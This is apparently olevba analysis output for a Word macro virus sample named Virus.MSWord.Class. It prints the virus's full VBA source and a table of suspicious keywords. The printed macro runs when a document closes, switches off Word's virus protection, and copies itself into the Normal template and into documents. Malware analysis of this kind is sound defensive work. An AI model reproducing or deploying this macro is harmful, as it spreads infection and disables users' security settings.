olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class-66b3e9c04cccf3b15dd781465d479b9c53b1b50b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class-66b3e9c04cccf3b15dd781465d479b9c53b1b50b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
On Error GoTo out
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
Options.VirusProtection = False
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
Options.SaveNormalPrompt = False
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
Options.ConfirmConversions = False
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
If Day(Now) = 31 Then MsgBox "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•" + Chr$(13) + "•  VicodinES /CB /TNN •" + Chr$(13) + "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•", 0, "This Is Class"
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
If nt = 0 Then
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
End If
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
If nt > 0 And ad > 0 Then GoTo out
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
host.codemodule.AddFromFile ("c:\class.sys")
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
With host.codemodule
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    For x = 1 To 4
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    .deletelines 1
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    Next x
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
End With
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
If nt = 0 Then
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    With host.codemodule
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    .replaceline 1, "Sub AutoClose()"
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    .replaceline 69, "Sub ToolsMacro()"
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    End With
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
End If
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
With host.codemodule
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    For x = 2 To 70 Step 2
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Now
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
    Next x
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
End With
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
out:
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
End Sub
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
Sub ToolsMacro()
'Tester2/22/01 8:09:25 PM2/22/01 8:09:25 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

